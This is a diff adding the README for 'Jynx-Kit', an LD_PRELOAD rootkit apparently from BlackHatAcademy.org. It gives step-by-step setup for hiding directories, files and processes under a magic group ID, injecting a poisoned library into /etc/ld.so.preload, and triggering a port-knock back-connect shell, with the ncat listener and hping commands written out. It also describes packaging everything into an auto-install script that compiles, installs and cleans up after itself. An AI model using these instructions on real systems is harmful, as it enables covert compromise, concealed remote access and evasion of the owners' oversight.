@@ -1,0 +1,96 @@
+                _   _,.-.' .-.
+            _ .' |,'   ."".| |.""._
+           ( || ,',"". `._`' `  '  `.
+           `\ | `" .-"`-..`     .    `.
+            |     `..--.._       |     \
+          _,|      _...'_.'     ,+.     `.
+     ,""'|   `...-'..""(__.._ -"   `"--.. `.
+    |`._,'  ,'  /\ .'""` .'""`. `.    |  `. \
+    '      / / /  ||    ||    |.`.`.   .   | \
+     `.__,'-._'  /|` -"'  `-.'  \ \ \   `"-'  \
+      ' `.   /  /_| | |'""| | .-""'`'"`-,.-"\  .
+     . / .\ .  /  | | `._.' ||        ,'     \  \
+    ' / / |/  /_.-+._`-..--"-.       .   .    \  `
+   / /.'  '  ,'""'-. `"."'""'`..     |.        \  \
+  / . |  j  .       . |        |\__," |.  `    '   \
+ .  | |  |  |       ' |        '|   | ' `  \    \   .
+ |    |  |  `.____,'   ..____,' |   |    .       \
+ |    |  |  | ._  _..---._   _,'    |       .        '
+ |    |  |  | | ""  .    |`"'   \ `.|     '  '  '     .
+ |    |  |  | |     |    |       `  `      .  .  \    |
+ |    |  |  | |     '    |        \  `.    |  |   .   |
+ '    '  |  | |      .   `         \   \   |  |   |   |
+  \      `  | |      |              .   `. |  |   |   |
+   \      \ ' |      `    '          `    `+..|___|___|_........
+    \      \ \|       '    .           `.    `.                 |
+     `.     \ .        .   `             `.    `-.            .'
+    _,'`.    \'         .   \              `-.._  `._       ,'
+ _."     `._ `.`        |    .                       `._   .
+`._       _,`"--`.      |     .                         `. |
+   `-._ ,'              |      `.                         `|_
+      ,'         |      |        `.                          `.
+    .'   __...__.|      |          \ __..._     _,..,.__       `.
+    `-`"'        `._..--'-.__      .'      `-..'        ``'"--..-'
+                             `"---' 
+			     
+			     
+    /$$$$$                                      /$$   /$$ /$$   /$$    
+   |__  $$                                     | $$  /$$/|__/  | $$    
+      | $$ /$$   /$$ /$$$$$$$  /$$   /$$       | $$ /$$/  /$$ /$$$$$$  
+      | $$| $$  | $$| $$__  $$|  $$ /$$//$$$$$$| $$$$$/  | $$|_  $$_/  
+ /$$  | $$| $$  | $$| $$  \ $$ \  $$$$/|______/| $$  $$  | $$  | $$    
+| $$  | $$| $$  | $$| $$  | $$  >$$  $$        | $$\  $$ | $$  | $$ /$$
+|  $$$$$$/|  $$$$$$$| $$  | $$ /$$/\  $$       | $$ \  $$| $$  |  $$$$/
+ \______/  \____  $$|__/  |__/|__/  \__/       |__/  \__/|__/   \___/  
+           /$$  | $$                                                   
+          |  $$$$$$/                                                   
+           \______/            
+
+
+	               BlackHatAcademy.org
+		          ErrProne / XO
+		     
+File list: bc.c config.h ld_poison.so Makefile packer.sh README
+
+0x01. Setting up config.h.
+
+	First of all, you need to dig into config.h, and ensure that the settings meet your needs.
+MAGIC_DIR should be changed to the name of the directory you want to hide from the system. This can
+be used as a prefix to your main directory as well as for files. MAGIC_GID will be the Group ID to
+hide as well. Make sure that you set MAGIC_DIR Group ID to MAGIC_GID for hiding purposes as well.
+This will help disguise the processes from the system, including commands like ps. CONFIG_FILE 
+defaults to ld.so.preload, which is usually located in /etc. You shouldn't have to change this 
+unless you're going to dig a little deeper into hiding Jynx-Kit. MAGIC_ACK and MAGIC_SEQ are both 
+used as the port knock sequence for back connect. The back connect program automatically sets GID 
+to MAGIC_GID, so no need to worry about this. You'll initiate the back connect using a program like 
+hping to manipulate the packets as needed.
+
+# ncat --ssl -l -p 31337                                              # setup ssl listener
+
+# hping localhost -s 31337 -M <MAGIC_SEQ> -L <MAGIC_ACK> -c 1         # make back connect phone home
+
+
+0x02. Configuring Makefile and Installing.
+
+	Once you have this configured, go ahead and open up Makefile. Make sure that MAGIC_GID 
+matches what you have in config.h. INSTALL should be set to the directory that you want to hide
+your files in. You can also set these variables upon calling "make install." See examples below.
+
+# make all              # compile bc and ld_poison.so
+
+# make install		# Installs bc and ld_poison, injects into ld preload, and sets correct GIDs
+
+# make install INSTALL=/omgxochi MAGIC_GID=100 
+
+	The last line installs the kid to /omgxochi, and sets the GID to 100. You should use GID
+of 100 for anything that you're going to run, and need to hide from the system.
+
+
+0x03. packer.sh
+	Now that you have everything configured and things compile correctly, you can use packer.sh
+in order to create an auto install shell script for future installations. Simply edit INSTALL_FILE
+and FILES variables (if you added or removed any files that originally came with Jynx-Kit). By 
+default, packer.sh creates install.sh, which can be run on any system, it will extract the source
+files, compile them, and install them to the defined hidden directory, then clean up all of the files.
+
+
